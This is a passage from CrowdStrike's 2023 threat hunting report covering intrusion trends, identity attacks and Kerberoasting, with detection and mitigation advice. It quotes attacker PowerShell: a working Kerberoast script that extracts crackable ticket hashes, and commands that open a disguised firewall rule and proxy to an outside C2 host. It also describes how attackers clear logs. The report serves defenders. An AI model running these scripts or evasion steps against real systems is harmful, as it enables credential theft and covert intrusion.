# NOWHERE TO HIDE
# CROWDSTRIKE 2023 THREAT HUNTING REPORT

## Table of Contents
- [Foreword](#foreword)
- [Introduction](#introduction)
- [Front-Line Snapshot](#front-line-snapshot)
- [Front-Line Observations](#front-line-observations)
    - [Adversaries Advance the Frontier of Identity Threats](#adversaries-advance-the-frontier-of-identity-threats)
    - [Don’t Get Burned by Kerberoasting](#dont-get-burned-by-kerberoasting)
    - [Beyond Usernames and Passwords](#beyond-usernames-and-passwords)
    - [Spotlight: Falcon OverWatch Identifies Missing MITRE Identity Technique](#spotlight-falcon-overwatch-identifies-missing-mitre-identity-technique)
    - [Left of Theft: Themes of Early-Stage eCrime](#left-of-theft-themes-of-early-stage-ecrime)
    - [INDRIK SPIDER Brings the Tailored Experience to Opportunistic eCrime](#indrik-spider-brings-the-tailored-experience-to-opportunistic-ecrime)
    - [Access Brokers Abuse Vulnerabilities  for Initial Access](#access-brokers-abuse-vulnerabilities-for-initial-access)
    - [Remote Monitoring and Management Tools](#remote-monitoring-and-management-tools)
    - [Adversaries Lead the Charge in Cloud Know-How](#adversaries-lead-the-charge-in-cloud-know-how)
    - [Adversaries Leverage LinPEAS Tool for Cloud Discovery](#adversaries-leverage-linpeas-tool-for-cloud-discovery)
    - [eCrime Adversaries Use Azure Run Commands to Deploy Malware](#ecrime-adversaries-use-azure-run-commands-to-deploy-malware)
    - [Compromised Cloud Credentials Facilitate Widespread Lateral Movement](#compromised-cloud-credentials-facilitate-widespread-lateral-movement)
    - [Cross-Platform Proficiency Takes Center Stage](#cross-platform-proficiency-takes-center-stage)
    - [Linux Insights and Trends](#linux-insights-and-trends)
    - [macOS Insights and Trends](#macos-insights-and-trends)
    - [Threat Actor Spotlight: LABYRINTH CHOLLIMA](#threat-actor-spotlight-labyrinth-chollima)
- [Conclusion](#conclusion)
- [About Falcon OverWatch](#about-falcon-overwatch)
- [CrowdStrike Products and Services](#crowdstrike-products-and-services)
- [About CrowdStrike](#about-crowdstrike)

## Foreword
Nearly 12 years ago, a scrappy group of technologists and security professionals 
came together with a simple idea: building world-class, cloud-delivered endpoint 
protection that leverages machine learning and artificial intelligence to create a 
highly dynamic security solution that continues to learn and evolve as endpoints 
are added and leverages automation to scale. 
But the product was only part of the story. This technology would be 
continuously augmented by professional, efficient incident responders who 
could transform their front-line insights into tangible data to feed it. The final part 
of the story is that all of this would be powered by intelligence, drawing on human 
expertise and ingenuity across a diverse range of disciplines to provide endpoint 
security that is, at its core, informed by today’s threat landscape. 
When we launched this idea under the CrowdStrike banner, we told the world 
they don’t have a malware problem, they have an adversary problem. Key to this 
message is stopping the breaches perpetrated by these adversaries. Through 
the combination of technology, people and intelligence, we raised the cost for 
these adversaries — and continue to do so every day. 
In the time since, CrowdStrike has continuously innovated. Our single-agent 
technology has grown into the vulnerability management space and driven 
innovation across cloud workloads, control planes, containers and the Internet of 
Things. We fulfilled our promise to deliver government-quality intelligence for the 
private sector and created an elite threat hunting team known as CrowdStrike® 
Falcon OverWatch™. As the CrowdStrike Intelligence and Falcon OverWatch 
teams evolved and grew, they increasingly collaborated on developing visibility 
from the CrowdStrike Falcon® platform into adversary insights, culminating in 
CrowdStrike tracking over 215 adversaries today.
The key to this collaboration is speed. When we talk about creating a security 
solution for the way the threat landscape looks today, we cannot ignore 
adversary speed. Over the past 12 months, the average breakout time for 
interactive eCrime intrusion activity was 79 minutes. Falcon OverWatch 
witnessed one adversary breakout time of just seven minutes. In less than 
the time it takes to step away from your desk and make a cup of coffee, this 
adversary had landed on an initial host and moved laterally into the broader 
victim environment.
The questions CISOs need to ask their teams are, “Have we gotten faster at 
identifying, investigating and remediating today’s threats? Can we detect an 
adversary in seven minutes or even seven hours?”
At CrowdStrike, we asked ourselves these questions. We came together to 
figure out how to get even faster at stopping breaches so our customers can go 
faster. We determined that closer alignment of threat hunting and intelligence 
would not only help us get faster but allow us to come back to the premise we 
started with: raising the cost to the adversary. 
> Through the combination 
> of technology, people and 
> intelligence, we raised the 
> cost for these adversaries 
> — and continue to do so 
> every day. 
With the release of the CrowdStrike 2023 Threat Hunting Report, we are 
announcing the formation of a new defensive unit: CrowdStrike Counter 
Adversary Operations. Its mission is to use the collaborative power of hunting 
and intelligence to raise the cost of doing business for threat actors and give the 
adversary nowhere to hide. 
This report is the first of many publications that readers can expect from 
CrowdStrike’s newly formed Counter Adversary Operations team. This team 
formally unites Falcon OverWatch and CrowdStrike Intelligence under a single 
umbrella, deepening the already well-established collaboration between these 
teams. 
This year’s report is the culmination of the past 12 months of proactive, 
intelligence-informed threat hunting. In this 12-month period, Falcon OverWatch 
threat hunters:
	
- Directly identified approximately one potential intrusion every seven 
minutes. Over the course of a year, this adds up to tens of thousands of 
instances where human-driven hunting was instrumental in uncovering 
adversaries actively seeking to evade autonomous detection methods. 
	
- Distilled their findings into the development of hundreds of new 
behavioral-based preventions. In practice, this means at least once 
per day on average, Falcon OverWatch threat hunters’ front-line findings 
directly augment the Falcon platform’s ability to detect and prevent 
the latest threats. Over the course of the past year alone, these new 
behavioral-based detections have enabled the Falcon platform to prevent 
an additional 1.5 million malicious events  that would have otherwise 
evaded autonomous detection methods.
These figures represent the Falcon OverWatch team’s around-the-clock 
efforts to disrupt the adversary. This work forces the adversary to change their 
approaches and directly raises their costs of operating.
Across all malicious activity tracked by CrowdStrike, 71% of intrusions were 
malware-free. In a time when adversaries increasingly rely on hands-on-
keyboard tactics to achieve their objectives, threat hunting operations must be 
informed by today’s best threat intelligence. 
The new Counter Adversary Operations team will relentlessly track, detect and 
ultimately disrupt the adversary no matter when or where they operate. 
Adam Meyers
SVP of Intelligence
> One potential intrusion 
> approximately every                    
> seven minutes
> 1.5 million additional 
> malicious events directly 
> prevented by the Falcon 
> platform 

## Introduction
Identity threats emerged as the major theme of interactive — aka hands-on-keyboard — intrusions 
discovered by the CrowdStrike® Falcon OverWatch™ threat hunting team in the past 12 months. In all aspects 
of operations, adversaries looked for ways to broaden their reach, optimize their tradecraft and deepen their impact. 
These operations often started with an identity compromise. Adversaries are not relying solely on compromised 
valid credentials, either — rather, they demonstrated their capacity to abuse all forms of identification and 
authorization, including weak credentials purchased from the underground, and they elevated their phishing 
and social engineering tradecraft.
In addition to the broad targeting of identity, several trends stood out this year related to eCrime. First, the continued 
exploitation of vulnerable software to gain access, particularly in the case of access brokers,[^1] demonstrates the need 
for organizations to have visibility into their external attack surface. The expanded use of zero-day vulnerabilities and 
the speed at which threat actors were able to develop N-day exploits underscore the importance of vulnerability 
management and patching. Second, the rampant use of legitimate remote monitoring and management (RMM) 
tools illustrates adversaries’ attempts to blend into enterprise noise and avoid detection. SCATTERED SPIDER, for 
example, utilizes numerous RMM tools, enabling them to avoid detection for protracted periods of time to access 
sensitive data and — more recently — deploy ransomware. Finally, Falcon OverWatch observed adversaries such 
as INDRIK SPIDER following their otherwise opportunistic initial access attempts with more tailored follow-on 
behaviors.
Consistent with the expectations outlined in last year’s report, Falcon OverWatch observed adversaries’ 
increased proficiency in attacks against cloud environments. In the past few months, adversaries have continued 
to demonstrate that they are adept at navigating all major cloud platforms. In particular, adversaries have been quick 
to learn how to take advantage of common misconfigurations or abuse the built-in cloud management tooling. 
The concerning reality is that some adversaries appear to have a better handle on victims’ cloud environments 
than the organizations themselves.
Finally, cross-platform proficiency is a hallmark of this year’s interactive intrusions. Exemplified by the 3CX 
supply chain attack perpetrated by LABYRINTH CHOLLIMA — and uncovered by CrowdStrike — many of today’s 
adversaries are able to confidently navigate multiple operating systems. Whether the adversary is leveraging native 
applications or cross-platform development tools, the need to be flexible and adapt to any target environment is 
paramount to continued operational success.
> Reader Note:
> This report is based on insights from the Falcon OverWatch threat hunting team from July 1, 2022, 
> through June 30, 2023.[^2] The findings relate specifically to interactive intrusion activity — that is, activity 
> where a threat actor was operating with hands-on-keyboard in a victim environment. Targeted adversaries 
> refer to state-nexus adversaries. 
[^1]: Access brokers are threat actors that specialize in breaching networks with the intention of selling or providing that access to others. 
[^2]: Unless stated otherwise, the terms “this year,” “the last year” or “the past year” used throughout the report refer to the period from July 1, 2022, to June 30, 2023.

## Front-Line Snapshot
In the reporting period from July 1, 2022, through June 30, 2023, Falcon OverWatch observed interactive intrusion 
volumes continue to climb, with a total year-over-year increase of 40%. The overall distribution of interactive intrusion 
activity by threat type remained relatively constant this year compared to previous years, with a small decrease in the 
proportion of targeted intrusion activity.
 
![Interactive intrusions over time, 2019 to 2023]
_Figure 1. Interactive intrusions over time, 2019 to 2023_
For the sixth consecutive year, the technology vertical topped the list for the most frequently targeted industry 
vertical. The telecommunications vertical, which normally holds the second spot, was displaced this year by the 
financial vertical, which saw a spike in targeting.
![Top 10 targeted verticals, July 2022 to June 2023]
_Figure 2. Top 10 targeted verticals, July 2022 to June 2023_
![Top five targeted verticals separated by adversary threat type, July 2022 to June 2023]
_Figure 3. Top five targeted verticals separated by adversary threat type, July 2022 to June 2023_
 
In the past year, the volume of interactive intrusion activity against the financial services industry increased by 
over 80%. Defenders in the financial industry should watch this trend closely, as the increased volume of activity 
is matched by an increased diversity of threats. This year, Falcon OverWatch uncovered activity in the financial 
industry spanning all adversary motivation types and targeting all three major operating systems as well as cloud 
infrastructure. 
North Korean adversaries are the most aggressive state-sponsored adversaries to target the financial sector. They 
continue to engage in prolific, financially motivated operations primarily targeting financial and financial technology 
(fintech) organizations. eCrime threat actors also routinely target the financial sector. Though some adversaries 
focus on stealing cryptocurrency or non-fungible tokens (NFTs), opportunistic big game hunting (BGH) ransomware 
and data theft campaigns remain the primary eCrime threat to financial institutions. Due to the victim organization's 
need to maintain system uptime and the sensitive nature of the sector, eCrime threat actors likely conclude that 
financial institutions are willing and able to pay ransom demands.
![Intrusion activity by threat actor heat map, July 2022 to June 2023]
_Figure 4. Intrusion activity by threat actor heat map, July 2022 to June 2023_
> Please note the following about the data presented in this heat map:
> 	
> - The heat mapping represents the number of distinct adversaries active within a particular vertical
> 	
> - The heat mapping does not represent the total number of intrusion attempts within a vertical, as multiple 
> intrusions by the same adversary group are represented only once
> 	
> - Attribution to a high degree of confidence is not always possible. This table does not reflect any unattributed 
> activity that occurred in any industry verticals
Targeted intrusion activity during this period notably correlated with the respective intelligence collection 
requirements and other priorities of each adversary grouping. The most straightforward of these is North Korean 
adversaries’ targeting of financial sector entities — as well as finance-related consulting services — as part of a 
widespread currency generation effort meant to leverage cryptocurrency theft and, to a lesser extent, ransomware. 
The diversity of sectors targeted by Iranian (KITTEN) and Chinese (PANDA) state-nexus adversaries are reflective 
of two distinct, but similar, tradecraft strategies. KITTEN adversaries increasingly rely on opportunistic exploitation 
of entities of interest, and PANDA adversaries continue to expand operations to achieve coverage across as many 
targets as possible.
The technology sector continues to be a high-value target for eCrime adversaries, with BGH operations posing 
the most prevalent eCrime threat to the sector. The technology sector’s reliance on and access to highly sensitive 
data make it an especially attractive target for BGH operators. BGH operations continue to rely on ransomware and 
data theft. Other prominent eCrime threats to the technology sector include enabling services, access brokers and 
information theft campaigns.
![MITRE ATT&CK heat map highlighting the top five techniques Falcon OverWatch observed adversaries use in each tactic area, June 2022 to July 2023]
_Figure 5. MITRE ATT&CK heat map highlighting the top five techniques Falcon OverWatch observed adversaries use in each tactic area, June 2022 to July 2023_
Falcon OverWatch tracks interactive intrusion activity against the MITRE ATT&CK® Enterprise Matrix, a framework that 
categorizes and tracks adversary behavior.[^3]
This heat map illustrates the top five techniques observed across the interactive intrusion activity discovered by Falcon 
OverWatch in each tactic area during the past year. The technique prevalence underscores a notable shift toward 
exploitation of identity across all stages of adversarial operations. This shift mirrors the evolution of organizations 
adapting to an increasingly disparate workforce, highlighting the morphing nature of the modern perimeter. 
No longer defined by a rigid outer shell, organizations today rely on identity as the pivotal control point. The consistent 
appearance of valid accounts across various tactics highlights the intensification of adversaries' strategic use of trusted 
accounts to gain initial access, establish persistence, elevate privileges and evade defenses. The concerning ease with 
which adversaries can gain initial access — often simply through purchases — blurs the distinction between legitimate 
users and imposters. Identifying such stealthy intruders necessitates proactive, identity-based threat hunting combined 
with a robust understanding of an organization's unique operational landscape.
For full details of the techniques and sub-techniques observed by Falcon OverWatch, see the Falcon OverWatch 2023 
MITRE ATT&CK heat map. 
[^3]: To learn more about MITRE ATT&CK, visit https://attack.mitre.org/matrices/enterprise/.

## Front-Line Observations
### Adversaries Advance the Frontier of Identity Threats
Today, 80% of breaches use compromised identities.[^4] The abuse of identity, 
particularly when coupled with creative defense evasion methodologies, enables 
adversaries to hide in plain sight. Despite identity being widely recognized as a 
growing security threat, the full spectrum of identity threats is not always well 
understood.
> Reader Note:
> Identity data refers to any information that uniquely identifies an individual 
> or entity (such as data associated with accounts) and authentication and 
> access controls (such as credentials, permissions, security tokens or digital 
> certificates). This scope may extend to additional factors of authentication 
> or data that can be used for the purposes of identity verification. A full list 
> can be seen on page 16. 
To ensure environments remain protected, hunters must work with the broadest 
possible definition of identity, as these types of data are prime targets for 
adversaries looking to maintain access, enable lateral movement and steal 
information. 
Taking a closer look at the specific techniques involved in identity threats reveals 
an interesting duality between new and old. Falcon OverWatch recently discovered 
and documented the abuse of network provider dynamic link libraries (DLLs) as a 
means to harvest valid credentials. A network provider DLL enables the Windows 
operating system to communicate with other types of networks by providing 
support for different networking protocols. This newly documented sub-technique[^5] 
sees adversaries operate without the need to touch the Local Security Authority 
Subsystem Service (LSASS) or dump the system Security Account Manager (SAM) 
hive, both of which are often highly monitored by security tools. This sub-technique 
provides an evasive way to access valid account details. In contrast, threat hunters 
also tracked a surge in an old and well-understood technique — Kerberoasting — 
with the resurgence likely due to continued effectiveness.
[^4]: As reported in the CrowdStrike 2023 Global Threat Report: https://www.crowdstrike.com/global-threat-report/.
[^5]: For more information on this sub-technique, see the MITRE website: https://attack.mitre.org/techniques/T1556/008/.
> Key Facts 
> and Figures 
> at a Glance:
>
> **62%**
> OF INTERACTIVE INTRUSIONS 
> INVOLVING THE ABUSE OF 
> VALID ACCOUNTS, WITH 34% 
> OF INTRUSIONS SPECIFICALLY 
> INVOLVED THE USE OF DOMAIN 
> ACCOUNTS OR DEFAULT ACCOUNTS
>
> **160%**
> INCREASE IN ATTEMPTS TO 
> GATHER SECRET KEYS AND OTHER 
> CREDENTIAL MATERIALS VIA 
> CLOUD INSTANCE METADATA APIs
>
> **583%**
> INCREASE IN KERBEROASTING 
> ATTACKS (A SUB-TECHNIQUE 
> OF STEAL OR FORGE KERBEROS 
> TICKETS), WITH VICE SPIDER 
> RESPONSIBLE FOR 27% OF ALL 
> KERBEROASTING ATTACKS

### DON’T GET BURNED BY KERBEROASTING
Over the past year, Falcon OverWatch observed a staggering 583% increase 
in Kerberoasting attacks[^6] to escalate privileges and enable lateral movement 
within a victim’s environment (see Figure 6). Windows devices use the Kerberos 
authentication protocol, which grants tickets to provide users access based on 
service principal names (SPNs). Kerberoasting specifically involves the theft of 
tickets associated with SPNs. These tickets contain encrypted credentials that can 
be cracked offline using brute-force methods to uncover the plaintext credentials.
Kerberoasting is a beneficial technique for adversaries because it targets an 
SPN associated with an Active Directory account, and because these SPNs are 
often tied to service accounts, they will usually have higher privileges and allow 
the adversary to extend their reach and gain access to sensitive files or systems. 
Additionally, these attacks can be challenging to detect because Kerberos activity is 
so prevalent in everyday telemetry, which allows adversaries to blend into the noise.  
Despite being well documented, this technique poses a significant threat to 
organizations because adversaries do not need elevated privileges to execute this 
attack. In the past year, attacks against Kerberos were associated predominantly 
with eCrime adversaries. VICE SPIDER was the most prolific eCrime adversary, 
responsible for 27% of all intrusions that involved the Kerberoasting technique. 
![Intrusions featuring Kerberoasting attacks]
_Figure 6. Intrusions featuring Kerberoasting attacks_
Of the interactive intrusions that involved the use of Kerberoasting, Falcon 
OverWatch identified a range of initial access vectors, including password spraying, 
accessing existing remote services through valid accounts, and exploiting 
vulnerable web servers though web application attacks. It is not unusual for Falcon 
OverWatch to observe Kerberoasting being used to facilitate lateral movement from 
a host without appropriate endpoint security coverage. 
[^6]: For more information on this sub-technique, see the MITRE website (https://attack.mitre.org/techniques/T1558/003/) 
or the detailed article from CrowdStrike (https://www.crowdstrike.com/cybersecurity-101/kerberoasting/).
> Service Principal 
> Name (SPN)
> An SPN is a unique identifier for services 
> running on servers in Active Directory. It is 
> especially important when using Kerberos 
> authentication. An SPN allows a service 
> to be mapped to a specific server, which 
> helps a client find that service within the 
> network. It also lets clients request service 
> authentication, even without knowing the 
> account name. Adversaries can misuse this 
> feature by scanning for SPNs associated 
> with high-privilege accounts. They can 
> perform attacks like Kerberoasting to 
> crack passwords and potentially gain 
> unauthorized access to resources.

#### Kerberoasting in Action
In an intrusion by VICE SPIDER, Falcon OverWatch discovered hands-on-keyboard activity against a victim 
organization in the academic sector. The compromise was associated with multiple hosts across virtual desktop 
infrastructure (VDI). The threat actor performed basic host reconnaissance to enumerate domain trusts using nltest, 
then enumerated administrator permissions groups and performed connectivity tests to outbound infrastructure. 
Next, the threat actor attempted to exploit the ZeroLogon vulnerability in an attempt to escalate privileges and then 
tested connectivity to a command-and-control (C2) server using ping. The threat actor then executed SystemBC 
and SocksProxyGo through PowerShell to proxy connections to their C2 infrastructure. The adversary was clearly 
mindful of being detected and took several steps to cover their tracks, including setting their proxy connection to 
operate over non-standard ports, creating a new firewall rule masquerading as a Windows update, and clearing the 
Security, Application and System logs using wevtutil. Further, they removed the registry entry for RunMRU and 
TypedPaths — two locations that would shed light on their interactive activity on the system.
> Snippet of SocksProxyGo execution to configure a new outbound firewall rule
> ```powershell
> New-NetFirewallRule -DisplayName "Windows Update" -Direction Outbound -Action Allow -Protocol 
> TCP -RemotePort 443 -Enabled True | Out-Null; Go -remotePort 443 -remoteHost "[REDACTED 
> IPAddress]"
> ```
> Snippet of the SystemBC proxy connection being established
> ```powershell
> $domain = '[REDACTED IPAddress]' # host $dport = 4001 # port $x = New-Object byte[] 50 For 
> ($i=0; $i -ne 50; $i++)
> ```
 
After this, the adversary executed a script to perform a Kerberoasting attack and enumerate SPNs. VICE SPIDER’s 
likely goal was to capture these SPNs to identify Windows service accounts and extract the password hashes. This 
was confirmed when Falcon OverWatch found the adversary using the Hashcat tool in an attempt to brute-force the 
password hashes.
> Snippet of a script execution in an attempt to enumerate SPNs 
> ```powershell
> $Null = [Reflection.Assembly]::LoadWithPartialName( 'System.IdentityModel' ); $search 
> = New-Object DirectoryServices.DirectorySearcher( [ADSI]'' ); $search.filter = 
> '(&(servicePrincipalName=*)(objectCategory=user))'; $results = $search.Findall(); foreach ( 
> $results in $results ) { $u = $results.GetDirectoryEntry(); $samAccountName = $u.samAccountName; 
> foreach ( $s in $u.servicePrincipalName )
> ```
The following is an expanded version of the script above, which was determined to be associated with the Invoke-
Kerberoast.ps1 PowerShell script. The Kerberoasting activity below involves Active Directory being queried to 
request the username and SPN associated with accounts that have an SPN set. The `$TicketHexStream` variable is 
storing the hexadecimal value of the Kerberos service ticket, which is then processed to extract a hash that can be 
used for offline password cracking. 
> ```powershell
> $Null = [Reflection.Assembly]::LoadWithPartialName( 'System.IdentityModel' ); $search 
> = New-Object DirectoryServices.DirectorySearcher( [ADSI]'' ); $search.filter = 
> '(&(servicePrincipalName=*)(objectCategory=user))'; $results = $search.Findall(); 
> foreach ( $results in $results ) { $u = $results.GetDirectoryEntry(); $samAccountName = 
> $u.samAccountName; foreach ( $s in $u.servicePrincipalName ) { $Ticket = $null; try { $Ticket 
> = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $s; 
> } catch [System.Management.Automation.MethodInvocationException] {} if ( $Ticket -ne $null 
> ) { $TicketByteStream = $Ticket.GetRequest(); if ( $TicketByteStream ) { $TicketHexStream 
> = [System.BitConverter]::ToString( $TicketByteStream ) -replace '-'; [System.Collections.
> ArrayList]$Parts = ( $TicketHexStream -replace '^(.*?)04820...(.*)', '$2' ) -Split 'A48201'; 
> $Parts.RemoveAt( $Parts.Count - 1 ); $Hash = $Parts -join 'A48201'; try { $Hash = $Hash.Insert( 
> 32, '$' ); $HashFormat = '$krb5tgs$23$*' + $samAccountName + '/' + $s + '*$' + $Hash; Write-Host 
> $HashFormat; break; } catch [System.Management.Automation.MethodInvocationException] {} } } } }
> ```

#### Top Five Tools Used in Kerberoasting Attacks
The following table lists — in order — the top five tools Falcon OverWatch observed adversaries use for Kerberoasting 
attacks over the past year.
| Tool | What It Does | How It Works |
|---|---|---|
| Rubeus | Rubeus is a C# tool that allows an adversary to interact with the Kerberos authentication mechanism. | Adversaries use this tool to perform attacks such as ticket manipulation, password brute-forcing, Kerberoasting, and Golden Ticket and Silver Ticket attacks. |
| PowerSploit | PowerSploit is an exploit framework that contains various modules, including Invoke-Kerberoast, a module designed to automate Kerberoasting functions. | Adversaries use this tool to automate the process of SPN enumeration, ticket manipulation and password cracking. |
| BloodHound/ SharpHound | BloodHound is a web-based tool that can be used to perform reconnaissance on Active Directory environments and identify attack paths that can be used in the context of a Kerberoasting attack. SharpHound is a PowerShell-based tool that can be used to enumerate Active Directory environments and retrieve data that can be visualized within BloodHound. | Adversaries typically use these tools together to understand and visualize a target’s Active Directory objects and environment, and then generate data that can be used to identify potential attack paths and privilege escalation opportunities. |
| Impacket | Impacket is a toolset of Python-based utilities that can be used to perform a wide range of attacks, including launching attacks to exploit weaknesses in the Kerberos protocol. Popular Impacket tools for performing Kerberoasting attacks include GetUserSPNs and Ticketer. | The GetUserSPNs utility can be used to enumerate service accounts within Active Directory by requesting service tickets for any accounts with associated SPNs. The Ticketer utility can be used to request service tickets with specific encryption types, which may cause the domain controller to encrypt the ticket with the user's password hash. This utility can then decrypt the service ticket to extract the password hash of a user. |
| SharpRoast | SharpRoast is a C# tool within the SharpTools toolset. The SharpRoast tool can be used to interact with the Kerberos protocol to perform Kerberoasting attacks. | Adversaries can use this tool to perform SPN enumeration and output results into various formats for analysis. The tool also performs the same functions as Ticketer, whereby it can decrypt service tickets to extract the password hash of a user. |
_Table 1. Top five tools Falcon OverWatch observed adversaries use for Kerberoasting attacks, July 2022 to June 2023_

#### Defensive Countermeasures
Falcon OverWatch increasingly sees adversaries using Kerberoasting to gain a 
greater foothold within Windows environments and escalate privileges. Defenders 
should investigate for signs of this activity to help identify protocol weaknesses and 
weak or compromised accounts, and find opportunities to improve detections.
The following recommendations will allow hunters to identify or mitigate this type of 
attack within their environment:
- **Interrogate Windows Event logs.**
Both Security Event ID 4769 (Kerberos Service Ticket Request) and Event ID 4771 
(Kerberos Pre-Authentication Failure) can indicate that Kerberoasting is taking 
place, especially when seen in large volumes over a short time period. Security 
Event ID 4769 should be filtered to look for Ticket Encryption Type 0x17 and 0x18, 
which indicate a weak RC4 cipher has been used that is prone to being cracked.
- **Filter for Kerberos network traffic that has RC4 encryption.**
Adversaries usually opt to exploit RC4 because it is insecure. RC4 replies can be 
indicative of an adversary attempting to request service tickets using this type of 
encryption. Defenders should disable RC4 where possible, as it is vulnerable to 
attack — and where possible, AES Kerberos encryption should be enabled.
- **Audit activity for accounts that are likely targets for Kerberoasting.**
This can be done by reviewing the Active Directory settings to see which service 
accounts have SPNs registered to them.
- **Ensure service account passwords are complex.**
This will make them more resistant to password cracking attempts. Ensuring unique 
passwords are used for each service account will prevent one compromise from 
affecting multiple accounts.
- **Take offensive action.**
Consider implementing a honey token approach to detect the use of service 
accounts with SPNs that have been deployed with weak passwords.

### BEYOND USERNAMES AND PASSWORDS
When discussing identity threats, it is important to distinguish different ways an entity can be identified and 
authenticated to a system. Though the majority of interactive intrusions observed by Falcon OverWatch involve 
abuse of valid accounts[^7] — which in most instances presents as username and password combinations — intrusions 
often leverage other factors of authentication and identifying material. Some of the most common methods of 
identification and authentication are shown in Figure 7.
![Commonly observed methods of identification and authentication]
_Figure 7. Commonly observed methods of identification and authentication_
Some less traditional means of identity abuse include the following:
	
- Attempts to gather secret keys and other credential materials via cloud instance metadata APIs, which rose by 
160% year over year
	
- Exploitation of weaknesses in Kerberos security to steal or forge authentication material, which rose by 410% 
year over year (the specific sub-technique of Kerberoasting rose by 583% year over year)
	
- Pass-the-Hash attacks, which rose by 200% year over year
	
- Abuse of Active Directory Certificate Services (AD CS), which was seen in the 2023 reporting period but not 
the 2022 reporting period 
[^7]: For more information on this technique, see the MITRE website: https://attack.mitre.org/techniques/T1078/.
This targeting of identity and authentication material showcases that valid accounts are highly prized by adversaries. 
Over the past year, 62% of all interactive intrusions used valid accounts. Adversaries do not stop there — 26% of all 
intrusions involved attempts to dump credentials,[^8] and 11% involved attempts to target unsecured credentials.[^9] All 
of this can facilitate access to sensitive data or support privilege escalation or lateral movement. Falcon OverWatch 
also observed adversaries targeting credentials in password stores,[^10] capturing user input[^11] and modifying the 
authentication process[^12] itself.
Threat actors are also seeking new and novel tactics in operations aimed at gaining credentials for cloud 
environments. In November 2022, a victim organization in a CrowdStrike Services case accidentally published its 
cloud service provider root account’s access key credentials to GitHub. Within seconds, automated scanners and 
multiple threat actors attempted to use the compromised credentials. The speed with which this abuse was initiated 
suggests that multiple threat actors — in efforts to target cloud environments — maintain automated tooling to 
monitor services such as GitHub for leaked cloud credentials.
Defenders may wonder how else adversaries are obtaining these valid login details. Interestingly, only 14% of 
intrusions where valid accounts were used also involved a brute-force[^13] attack. Of the remaining 86% of intrusions 
involving a valid account, over half originated from a system external to the organization. This suggests these 
accounts were likely obtained through credential harvesting, password reuse, phishing, an insider threat, or session 
hijacking, or they were purchased from an initial access broker. 
[^8]: For more information on this technique, see the MITRE website: https://attack.mitre.org/techniques/T1003/.
[^9]: For more information on this technique, see the MITRE website: https://attack.mitre.org/techniques/T1552/.
[^10]: For more information on this technique, see the MITRE website: https://attack.mitre.org/techniques/T1555/.
[^11]: For more information on this technique, see the MITRE website: https://attack.mitre.org/techniques/T1056/.
[^12]: For more information on this technique, see the MITRE website: https://attack.mitre.org/techniques/T1556/.
[^13]: For more